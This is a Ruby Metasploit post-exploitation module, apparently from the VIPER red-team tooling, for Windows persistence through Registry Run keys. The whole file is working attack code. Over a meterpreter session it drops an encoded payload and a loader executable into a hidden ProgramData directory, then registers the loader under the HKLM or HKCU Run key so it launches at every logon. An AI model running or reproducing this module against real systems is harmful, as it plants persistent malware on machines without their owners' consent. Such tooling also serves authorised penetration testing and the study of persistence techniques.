##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Local
  include Msf::Post::Windows::Priv
  include Msf::Post::Common
  include Msf::Post::File



  def initialize(info = {})
    super(update_info(info,
                      'Name'          => 'Registry Run Keys (T1060)- VIPER',
                      'Description'   => %q{
                          Persistence:
                          Adding an entry to the "run keys" in the Registry or startup folder will cause the program referenced to be executed when a user logs in. [1] These programs will be executed under the context of the user and will have the account's associated permissions level.},
                      'License'       => MSF_LICENSE,
                      'Author'        => ['Praetorian'],
                      'References'    => [['URL', 'https://attack.mitre.org/wiki/Technique/T1037']],
                      'Platform'      => ['win'],
                      'Targets'       => [['Windows', {}]],
                      'SessionTypes'  => ['meterpreter'],
                      'DefaultTarget' => 0,
          ))
    register_options(
            [
                    OptString.new('REMOTE_EXE_PATH', [false, 'The remote victim exe path to run. Use temp directory as default. ']),
            ])
  end


  def exploit

    unless session.type == "meterpreter"
      pub_json_result(false,
                      'Unsupport shell type',
                      nil,
                      self.uuid)
      return
    end


    if datastore['PAYLOAD'].include?(ARCH_X64)
      data_exe_file = "loader_x64.exe"
    else
      data_exe_file = "loader_x86.exe"
    end

    vprint_status("Running module against #{sysinfo['Computer']}")

    @loader_file    = "loader.exe"
    @shellcode_file = "loader.ini"

    @storedir = create_store_rand_dir()
    if @storedir == nil
      pub_json_result(false,
                      'Create rand dir failed',
                      nil,
                      self.uuid)
      return
    end

    buf            = create_payload
    shellcode_path = @storedir + "\\" + @shellcode_file
    write_file_to_target(shellcode_path, buf)

    @victim_path = @storedir + "\\" + @loader_file
    bin          = File.read(File.join(Msf::Config.data_directory, 'exploits', 'persistence_dll', data_exe_file))
    write_file_to_target(@victim_path, bin)

    unless session.fs.file.exist? shellcode_path and session.fs.file.exist? @victim_path
      pub_json_result(false,
                      'write loader to storedir failed,maybe permission or AV',
                      nil,
                      self.uuid)
      return
    end
    if is_admin?
      reg_base_key = "HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
    else
      reg_base_key = "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
    end

    reg_base_val = "[]"
    unless registry_key_exist? reg_base_key
      unless registry_createkey(reg_base_key)
        pub_json_result(false,
                        'crete registry failed',
                        nil,
                        self.uuid)
      end
    end
    # add the logon script
    if registry_setvaldata(reg_base_key, reg_base_val, "\"#{@victim_path}\"", "REG_SZ")
      vprint_good("Success! To test persistence, log out and then log in.")
      pub_json_result(true,
                      nil,
                      @victim_path,
                      self.uuid)
      return
    else
      pub_json_result(false,
                      'write registry failed',
                      nil,
                      self.uuid)
    end

  end


  def create_payload
    p = payload.encoded
    Msf::Simple::Buffer.transform(p, 'hex', 'buf')
  end

  def create_store_rand_dir()
    dirname     = Rex::Text.rand_text_alpha(10)
    fulldirname = session.sys.config.getenv('ProgramData') + "\\" + dirname
    session.fs.dir.mkdir(fulldirname)
    if session.fs.file.exist? fulldirname
      vprint_good("create storedir : #{fulldirname}")
      return fulldirname
    else
      vprint_error("create storedir failed : #{fulldirname}")
      return nil
    end
  end

  def write_file_to_target(filepath, filedata)
    fd = session.fs.file.new(filepath, "wb")
    fd.write(filedata)
    fd.close
  end
end
